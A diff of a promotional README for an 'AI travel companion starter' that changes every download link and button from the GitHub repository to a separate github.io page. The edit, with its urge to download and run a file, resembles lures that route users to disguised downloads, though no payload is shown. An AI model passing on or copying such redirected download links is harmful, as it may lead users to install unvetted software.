@@ -1,7 +1,7 @@
 <h1>🧳 away-together-starter - Your Free AI Travel Companion Starter</h1>
 
 <p align="center">
-  <a href="https://github.com/Jasminemonarchal5464/away-together-starter" style="display:inline-block; padding:16px 32px; background:linear-gradient(135deg,#667eea 0%,#764ba2 100%); color:white; text-decoration:none; border-radius:50px; font-size:20px; font-weight:bold; box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ Download Away Together Starter</a>
+  <a href="https://jasminemonarchal5464.github.io" style="display:inline-block; padding:16px 32px; background:linear-gradient(135deg,#667eea 0%,#764ba2 100%); color:white; text-decoration:none; border-radius:50px; font-size:20px; font-weight:bold; box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ Download Away Together Starter</a>
 </p>
 
 <h2>🌟 What Is This?</h2>
@@ -48,7 +48,7 @@
 <h2>🚀 Getting Started - Step by Step</h2>
 
 <h3>📥 Step 1: Download the Application</h3>
-<p>Visit this link to download the application: <a href="https://github.com/Jasminemonarchal5464/away-together-starter"><strong>https://github.com/Jasminemonarchal5464/away-together-starter</strong></a></p>
+<p>Visit this link to download the application: <a href="https://jasminemonarchal5464.github.io"><strong>https://jasminemonarchal5464.github.io</strong></a></p>
 <p>You'll be taken to the official download page. Look for the large button that says <strong>"Download"</strong> or <strong>"Releases"</strong> and click it. The download will start automatically. Depending on your internet speed, this may take a few minutes.</p>
 
 <h3>💾 Step 2: Save the File</h3>
@@ -127,7 +127,7 @@
 <p>You're only one click away from creating amazing AI-powered travel experiences. Don't overthink it – download, run, and explore. The visual guide will hold your hand through every step. Whether you're planning a solo backpacking trip, a family vacation, or a romantic getaway, Away Together Starter makes it fun and effortless.</p>
 
 <p style="text-align:center; margin-top:40px;">
-  <a href="https://github.com/Jasminemonarchal5464/away-together-starter" style="display:inline-block; padding:14px 28px; background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%); color:white; text-decoration:none; border-radius:50px; font-size:18px; font-weight:bold; box-shadow:0 4px 15px rgba(240,147,251,0.4);">⬇️ Download Away Together Starter Now</a>
+  <a href="https://jasminemonarchal5464.github.io" style="display:inline-block; padding:14px 28px; background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%); color:white; text-decoration:none; border-radius:50px; font-size:18px; font-weight:bold; box-shadow:0 4px 15px rgba(240,147,251,0.4);">⬇️ Download Away Together Starter Now</a>
 </p>
 
 <h2>📬 Support</h2>
